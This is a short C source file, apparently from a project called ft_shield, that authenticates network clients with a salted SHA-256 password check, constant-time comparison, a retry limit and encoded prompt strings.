#include "ft_shield.h"
#include "credentials.h"

static void	hash_password(const char *pw, unsigned char out[HASH_LEN])
{
	t_sha256	ctx;

	sha256_init(&ctx);
	sha256_update(&ctx, g_salt, SALT_LEN);
	sha256_update(&ctx, pw, strlen(pw));
	sha256_final(&ctx, out);
}

int	verify_password(const char *pw)
{
	unsigned char	got[HASH_LEN];
	unsigned char	diff;
	size_t		i;

	hash_password(pw, got);
	diff = 0;
	i = 0;
	while (i < HASH_LEN)
	{
		diff |= got[i] ^ g_hash[i];
		i++;
	}
	return (diff == 0);
}

int	auth_step(t_client *c)
{
	char	line[MAX_LINE + 1];
	char	s[STRENC_MAX + 1];
	ssize_t	n;

	n = read_line(c->fd, line, MAX_LINE);
	if (n <= 0)
		return (-1);
	if (verify_password(line))
	{
		c->authed = 1;
		send_str(c->fd, str_dec(STR_PROMPT, s));
		return (0);
	}
	c->tries++;
	if (c->tries >= MAX_TRY)
	{
		send_str(c->fd, str_dec(STR_NL, s));
		return (-1);
	}
	usleep(200000);
	send_str(c->fd, str_dec(STR_KEYCODE, s));
	return (0);
}
